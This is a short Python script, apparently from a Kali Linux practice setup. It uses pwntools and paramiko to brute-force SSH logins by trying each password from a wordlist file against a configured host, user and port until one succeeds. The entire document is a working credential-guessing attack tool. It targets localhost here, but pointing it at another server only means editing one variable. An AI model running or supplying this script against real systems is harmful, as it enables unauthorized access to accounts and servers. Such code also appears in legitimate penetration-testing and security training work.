from pwn import *
import paramiko

host = "127.0.0.1"
user = "kali"
port = 22
attempts = 0

with open("/home/kali/wordlist.txt","r") as wordlist:
	for item in wordlist:
		item = item.strip()
		try:
			print(f"[{attempts}] Attempting password: \"{item}\"")
			response = ssh(host=host, user=user, password=item, port=port,timeout=1)
			if response.connected():
				print(f"[+] Valid Credentials Found: \"{item}\"")
				response.close()
				break
			response.close()
		except paramiko.ssh_exception.AuthenticationException:
			print("[-] Invalid Password!")
			attempts += 1
		except paramiko.ssh_exception.SSHException as e:
			print(f"[-] SSH error: {e}")
		except Exception as e:
			print(f"[-] General error: {e}")